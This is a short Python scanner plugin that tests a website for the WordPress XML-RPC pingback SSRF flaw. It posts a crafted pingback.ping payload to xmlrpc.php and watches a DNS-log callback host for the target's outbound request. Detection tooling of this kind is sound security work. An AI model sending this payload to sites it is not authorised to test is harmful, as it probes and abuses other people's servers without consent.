#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import asyncio
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./', './wordpress/']):
                    dns = self.get_dnslog()
                    url = path + 'xmlrpc.php'
                    headers = {"Content-Type": "text/xml"}
                    data = '''<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://{dns}/</string></value></param>
<param><value><string>{path}?p=1</string></value></param>
</params>
</methodCall>'''.format(dns=dns, path=path)
                    async with session.post(url=url, data=data, headers=headers) as res:
                        if res != None:
                            await asyncio.sleep(1)
                            if await self.get_dnslog_recode(dns):
                                yield url
                                return
